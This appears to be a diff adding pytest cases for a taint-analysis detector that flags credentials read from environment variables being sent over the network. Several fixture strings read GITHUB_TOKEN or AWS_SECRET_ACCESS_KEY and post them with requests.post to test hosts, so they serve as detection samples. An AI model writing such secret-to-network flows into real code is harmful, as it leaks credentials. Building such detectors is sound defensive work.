@@ -324,6 +324,117 @@ class Api:
     ]
 
 
+def test_credential_taint_killed_by_safe_overwrite_before_sink() -> None:
+    source = (
+        "import os, requests\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "secret = 'safe'\n"
+        "requests.post('https://legitimate.example', data=secret)\n"
+    )
+    assert find_credential_network_flows(ast.parse(source), source) == []
+
+
+def test_credential_sink_before_safe_overwrite_still_flows() -> None:
+    source = (
+        "import os, requests\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "requests.post('https://example.test', data=secret)\n"
+        "secret = 'safe'\n"
+    )
+    flows = find_credential_network_flows(ast.parse(source), source)
+    assert [(flow.source.line, flow.sink.line) for flow in flows] == [(2, 3)]
+
+
+def test_credential_taint_can_be_retainted_after_safe_overwrite() -> None:
+    source = (
+        "import os, requests\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "secret = 'safe'\n"
+        "secret = os.getenv('AWS_SECRET_ACCESS_KEY')\n"
+        "requests.post('https://example.test', data=secret)\n"
+    )
+    flows = find_credential_network_flows(ast.parse(source), source)
+    assert [(flow.source.description, flow.sink.line) for flow in flows] == [
+        ("os.getenv('AWS_SECRET_ACCESS_KEY')", 5)
+    ]
+
+
+def test_credential_taint_copy_is_independent_of_original_overwrite() -> None:
+    source = (
+        "import os, requests\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "copied = secret\n"
+        "secret = 'safe'\n"
+        "requests.post('https://example.test', data=copied)\n"
+    )
+    flows = find_credential_network_flows(ast.parse(source), source)
+    assert [(flow.source.line, flow.sink.line) for flow in flows] == [(2, 5)]
+
+
+def test_credential_taint_all_branch_kill_removes_taint() -> None:
+    source = (
+        "import os, requests\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "if condition:\n"
+        "    secret = 'safe'\n"
+        "else:\n"
+        "    secret = 'also-safe'\n"
+        "requests.post('https://example.test', data=secret)\n"
+    )
+    flows = find_credential_network_flows(ast.parse(source), source)
+    assert flows == []
+
+
+def test_credential_taint_one_branch_kill_keeps_incoming_taint() -> None:
+    source = (
+        "import os, requests\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "if condition:\n"
+        "    secret = 'safe'\n"
+        "requests.post('https://example.test', data=secret)\n"
+    )
+    flows = find_credential_network_flows(ast.parse(source), source)
+    assert [(flow.source.line, flow.sink.line) for flow in flows] == [(2, 5)]
+
+
+def test_helper_parameter_safe_overwrite_is_not_summarized() -> None:
+    source = (
+        "import os, requests\n"
+        "def send(value):\n"
+        "    value = 'safe'\n"
+        "    requests.post('https://example.test', data=value)\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "send(secret)\n"
+    )
+    assert find_credential_network_flows(ast.parse(source), source) == []
+
+
+def test_helper_parameter_sink_before_overwrite_is_summarized() -> None:
+    source = (
+        "import os, requests\n"
+        "def send(value):\n"
+        "    requests.post('https://example.test', data=value)\n"
+        "    value = 'safe'\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "send(secret)\n"
+    )
+    flows = find_credential_network_flows(ast.parse(source), source)
+    assert [(flow.source.line, flow.sink.line) for flow in flows] == [(5, 3)]
+
+
+def test_helper_return_safe_overwrite_is_not_summarized() -> None:
+    source = (
+        "import os, requests\n"
+        "def load_token():\n"
+        "    value = os.getenv('GITHUB_TOKEN')\n"
+        "    value = 'safe'\n"
+        "    return value\n"
+        "secret = load_token()\n"
+        "requests.post('https://example.test', data=secret)\n"
+    )
+    assert find_credential_network_flows(ast.parse(source), source) == []
+
+
 @pytest.mark.parametrize(
     "source",
     [
